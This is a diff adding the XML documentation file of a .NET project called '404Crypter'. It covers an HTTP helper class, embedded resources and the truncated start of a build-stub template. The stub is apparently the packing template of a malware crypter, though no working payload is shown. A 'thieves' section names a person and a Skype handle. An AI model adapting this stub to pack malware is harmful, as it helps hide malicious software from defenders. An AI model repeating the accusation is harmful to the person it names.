@@ -1,0 +1,141 @@
+﻿<?xml version="1.0"?>
+<doc>
+<assembly>
+<name>
+404Crypter
+</name>
+</assembly>
+<members>
+<member name="T:Crypter.Utility.Http">
+	<warning>DO NOT REMOVE ANY OF THIS INFORMATION.</warning>
+	<summary>Wrapper for HttpWebRequest/HttpWebResponse to make life easier :D</summary>
+	<author>idb</author>
+	<author_url>http://s.olution.cc/</author_url>
+	<credits>
+ stimms - http://stackoverflow.com/users/361/stimms
+ </credits>
+	<remarks>
+ Although this class is open source I DO NOT grant anyone permission to use it in projects for monetary gain.
+ This class is to only be used for educational purposes in open source/freeware projects and if the author (me) is given credit. 
+ Please don't take advantage of my willingness to share code and steal money out of my pocket.
+ </remarks>
+	<thieves>
+ This section is reserved for keeping track of people who have gone against my wishes and are making money off this class without my permission.
+ GeoCoreTV aka TKzGhostRider aka TKzTechnology (Skype: anders18881) - http://goo.gl/E191G
+ </thieves>
+	<last_update>Tuesday, July 3, 2012</last_update>
+	<update_history>
+ Friday, January 13, 2012
+          Added another GetUploadResponse method that allows you to pass PostData as Byte().
+ Saturday, January 14, 2012
+         Handled "The underlying connection was closed:" exceptions in ProcessException function.
+         Included Request (HttpWebRequest) object into HttpResponse class.
+ Wednesday, February 22, 2012
+          Accept, Accept-Language, Accept-Encoding will no longer be sent if the property is empty.
+ Tuesday, February 28, 2012
+          Removed some unnecessary DirectCast's in the GetResponse and GetUploadResponse methods.
+ Wednesday, March 21, 2012
+          Handled GMT dates on cookie expiration parsing
+          Added RequestUri/ResponseUri and RequestHeaders/ResponseHeaders to HttpResponse class
+ Sunday, March 25, 2012
+          Added IsValidUri function
+ Tuesday, March 27, 2012
+          Fixed an error in the ParseCookies function
+          Got rid of unnecessary FindCookie functions
+ Wednesday, April 4, 2012
+          Updated ParseCookies, GetCookies, and FindCookie functions
+ Tuesday, May 22, 2012
+          Updated/Consolidated GetResponse and GetUploadResponse methods. 
+          Removed CancelRequest method.
+          Removed ForceHttps property. 
+ Thursday, May 24, 2012
+          Updated GetRedirectUrl function.
+          Replaced GetContentType function with GetMIMEType.
+ Friday, June 1, 2012
+          Added Method parameter to GetResponse methods (now supports PUT as well as GET/POST).
+          Added TimeStampLong function for getting epoch millisecond timestamps.
+          Fixed problem in auto-redirection caused by new Method parameter in GetResponse methods.
+ Monday, June 4, 2012
+          Added Properties UseCustomCookies and CustomCookies (used for sending specific cookies on a per request basis without disturbing the session cookies).
+          Added ImageToBase64/Base64ToString functions.
+ Friday, June 15, 2012
+          Added SendChunked property.
+ Friday, June 23, 2012
+          Fixed bug in GetResponse (Multi-Part) method that caused data to be posted incorrectly
+ Saturday, June 30, 2012
+          Fixed problem with headers in SendRequest method
+          Added CookieBlacklist.
+ Tuesday, July 3, 2012
+          Fixed problem with cookie domain value
+          Handled another auto-redirection method
+ </update_history>
+</member><member name="P:Crypter.My.Resources.Resources.ResourceManager">
+	<summary>
+  Returns the cached ResourceManager instance used by this class.
+</summary>
+</member><member name="P:Crypter.My.Resources.Resources.Culture">
+	<summary>
+  Overrides the current thread's CurrentUICulture property for all
+  resource lookups using this strongly typed resource class.
+</summary>
+</member><member name="P:Crypter.My.Resources.Resources.Asem">
+	<summary>
+  Looks up a localized string similar to &lt;Assembly: AssemblyTitle("%Title%")&gt; 
+&lt;Assembly: AssemblyDescription("%Description%")&gt; 
+&lt;Assembly: AssemblyCompany("%Company%")&gt; 
+&lt;Assembly: AssemblyProduct("%Product%")&gt; 
+&lt;Assembly: AssemblyCopyright("%Copyright%")&gt; 
+&lt;Assembly: AssemblyTrademark("%Trademark%")&gt; 
+&lt;Assembly: AssemblyFileVersion("%FileVersion%")&gt; .
+</summary>
+</member><member name="P:Crypter.My.Resources.Resources.Capture">
+	<summary>
+  Looks up a localized resource of type System.Drawing.Bitmap.
+</summary>
+</member><member name="P:Crypter.My.Resources.Resources.DarkFire">
+	<summary>
+  Looks up a localized resource of type System.Byte[].
+</summary>
+</member><member name="P:Crypter.My.Resources.Resources.Mono_Cecil">
+	<summary>
+  Looks up a localized resource of type System.Byte[].
+</summary>
+</member><member name="P:Crypter.My.Resources.Resources.pourquoi">
+	<summary>
+  Looks up a localized resource of type System.Byte[].
+</summary>
+</member><member name="P:Crypter.My.Resources.Resources.Source">
+	<summary>
+  Looks up a localized string similar to Imports System, Microsoft.VisualBasic
+Imports System.Reflection
+Imports System.Text
+Imports System.Security.Cryptography
+Imports System.IO.Compression
+Imports System.IO
+Imports System.Diagnostics
+
+'[ASEMBLYCODE]
+&lt;Assembly: AssemblyKeyFileAttribute("STRONGNAMELOCATION")&gt; 
+
+Public Class _BASE
+    Shared ASM As Assembly = Assembly.GetExecutingAssembly()
+    Shared RM As New Resources.ResourceManager("Z", ASM)
+    Shared Bind As Boolean = %BindCheck%
+    Shared Once As Boolean = %OnceCheck%
+     [rest of string was truncated]";.
+</summary>
+</member><member name="P:Crypter.My.Resources.Resources.Xenocode">
+	<summary>
+  Looks up a localized resource of type System.Byte[].
+</summary>
+</member><member name="T:Crypter.My.Resources.Resources">
+	<summary>
+  A strongly-typed resource class, for looking up localized strings, etc.
+</summary>
+</member><member name="T:Crypter.License">
+	<summary>
+ License Loader, Version: 2.0.0.3, Changed: 12/23/2012
+ </summary>
+</member>
+</members>
+</doc>
